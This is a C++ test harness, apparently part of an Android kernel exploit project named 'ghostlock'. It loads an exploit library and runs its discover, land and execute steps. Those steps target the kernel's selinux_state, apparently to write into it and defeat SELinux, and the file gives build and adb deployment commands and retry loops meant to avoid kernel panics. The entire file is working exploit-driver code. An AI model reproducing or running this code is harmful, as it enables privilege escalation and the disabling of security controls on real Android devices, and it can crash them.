/**
 * @file api_probe.cpp
 * @brief 设备探针：dlopen `libghostlock43499.so`，走 JNI 背后的**同一份** C API。
 *
 * 用途：与 `build/ghostlock-core-dev`（`main_dev` → `attack_write` 直连路径）对拍，
 * 证明"JNI 包装后的入口"与"原生直连入口"在同一配置下给出相同读数。
 *
 * 用法：`./ghostlock-api-probe [split|oneshot]`
 *   - `oneshot`（默认）：`run_mcast`，与 `main_dev` 的一次写等价；
 *   - `split`：`discover → land → execute`，即 Kotlin 生产路径的形状。
 *
 * @note 只调 `glk43499_api_*`，不碰 JNI 符号（那些要 JNIEnv，只能在 Kotlin 里调）。
 * @note 临时物：JNI 对拍完成后删除。
 *
 * 构建（arm64）：
 *   $NDK/.../aarch64-linux-android24-clang++ -std=c++23 -O2 -fPIE -pie -D__ARM \
 *     -static-libstdc++ dev/api_probe.cpp -o build/ghostlock-api-probe
 *
 * 运行：
 *   adb push build/ghostlock-api-probe build/libghostlock43499.so /data/local/tmp/
 *   adb shell 'cd /data/local/tmp && LD_LIBRARY_PATH=. ./ghostlock-api-probe oneshot'
 */
#include <cstdint>
#include <cstdio>
#include <cstring>

#ifdef GLK_PROBE_STATIC
/* 直接链接模式：与直连二进制同一批对象，用来隔离"dlopen 环境"这个变量。 */
#include "api.h"
#else
#include <dlfcn.h>
namespace {
    using CreateFn = std::int32_t (*)();
    using TargetFn = std::uint64_t (*)();
    using DiscoverFn = std::uint64_t (*)(std::uint64_t);
    using LandFn = std::uint64_t (*)(std::uint64_t, std::uint64_t);
    using RunFn = std::int32_t (*)(std::uint64_t);
    using LastFn = std::int32_t (*)();
} // namespace
#endif

int main(int argc, char **argv) {
    const bool split = argc > 1 && std::strcmp(argv[1], "split") == 0;

#ifdef GLK_PROBE_STATIC
    auto create = &glk43499_api_create;
    auto target_fn = &glk43499_api_selinux_target;
    auto discover = &glk43499_api_discover;
    auto land = &glk43499_api_land;
    auto run = &glk43499_api_run_mcast;
    auto execute = &glk43499_api_execute_mcast;
    auto close_fn = &glk43499_api_close;
    auto last_step = &glk43499_api_last_step;
    auto last_errno = &glk43499_api_last_errno;
    const char *mode_name = split ? "split/static" : "oneshot/static";
#else
    void *lib = dlopen("libghostlock43499.so", RTLD_NOW);
    if (!lib) {
        std::fprintf(stderr, "dlopen failed: %s\n", dlerror());
        return 2;
    }
    auto create = reinterpret_cast<CreateFn>(dlsym(lib, "glk43499_api_create"));
    auto target_fn = reinterpret_cast<TargetFn>(dlsym(lib, "glk43499_api_selinux_target"));
    auto discover = reinterpret_cast<DiscoverFn>(dlsym(lib, "glk43499_api_discover"));
    auto land = reinterpret_cast<LandFn>(dlsym(lib, "glk43499_api_land"));
    auto run = reinterpret_cast<RunFn>(dlsym(lib, "glk43499_api_run_mcast"));
    auto execute = reinterpret_cast<RunFn>(dlsym(lib, "glk43499_api_execute_mcast"));
    auto close_fn = reinterpret_cast<void (*)()>(dlsym(lib, "glk43499_api_close"));
    auto last_step = reinterpret_cast<LastFn>(dlsym(lib, "glk43499_api_last_step"));
    auto last_errno = reinterpret_cast<LastFn>(dlsym(lib, "glk43499_api_last_errno"));
    if (!create || !target_fn || !discover || !land || !run || !execute ||
        !close_fn || !last_step || !last_errno) {
        std::fprintf(stderr, "dlsym failed\n");
        return 2;
    }
    const char *mode_name = split ? "split/dlopen" : "oneshot/dlopen";
#endif

    const std::int32_t created = create();
    std::printf("probe create=%d mode=%s\n", created, mode_name);
    if (created != 0) return 3;

    const std::uint64_t target = target_fn();
    std::printf("probe target=0x%016llx\n", static_cast<unsigned long long>(target));
    if (target == 0) return 3;

    std::int32_t routed = 0;
    if (split) {
        /* 分步形态的重试由调用方（Kotlin）负责：`land` 返回 0 表示页被拒收
         * （例如偶数位会写坏 selinux_state.initialized），整页重来。 */
        for (int attempt = 1; attempt <= 6 && routed == 0; ++attempt) {
            const std::uint64_t mm = discover(target);
            std::printf("probe attempt=%d discover=0x%016llx\n", attempt,
                        static_cast<unsigned long long>(mm));
            if (mm == 0) continue;
            const std::uint64_t base = land(mm, target);
            std::printf("probe attempt=%d land=0x%016llx\n", attempt,
                        static_cast<unsigned long long>(base));
            if (base == 0) continue;
            routed = execute(target);
            std::printf("probe attempt=%d routed=%d step=%d errno=%d\n", attempt,
                        routed, last_step(), last_errno());
            if (attempt == 1) {
                /* 守卫自检：同一页再 land 一次、再 execute 一次，都必须被拒绝
                 * 且不能 exit（step=70/71, errno=EALREADY=17）。 */
                const std::uint64_t again = land(mm, target);
                std::printf("probe guard land-again base=0x%016llx step=%d errno=%d\n",
                            static_cast<unsigned long long>(again), last_step(),
                            last_errno());
                const std::int32_t again_run = execute(target);
                std::printf("probe guard exec-again routed=%d step=%d errno=%d\n",
                            again_run, last_step(), last_errno());
            }
        }
    } else {
        /* 与直连路径等价的重试：直连的 prepare_good_kernel_page 最多 6 次，
         * 每次整页重来。单发（不重试）在本机实测会在坏页上直接 panic。 */
        for (int attempt = 1; attempt <= 6 && routed == 0; ++attempt) {
            routed = run(target);
            std::printf("probe attempt=%d routed=%d step=%d errno=%d\n", attempt,
                        routed, last_step(), last_errno());
        }
    }
    std::printf("probe routed=%d step=%d errno=%d\n", routed, last_step(),
                last_errno());
    close_fn();
    return routed == 1 ? 0 : 1;
}
